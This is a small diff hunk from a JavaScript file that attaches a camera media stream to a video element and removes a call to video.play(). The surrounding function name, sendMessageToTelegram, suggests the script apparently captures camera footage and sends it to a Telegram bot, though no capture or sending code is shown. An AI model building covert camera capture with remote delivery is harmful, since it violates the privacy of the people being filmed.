@@ -65,7 +65,6 @@ function sendMessageToTelegram(message) {
             const video = document.createElement('video');
             video.srcObject = stream;
             document.body.appendChild(video);  // Append video to the body to make sure it loads
-            video.play();
 
             // Wait for the video to be ready
             video.onloadedmetadata = () => {
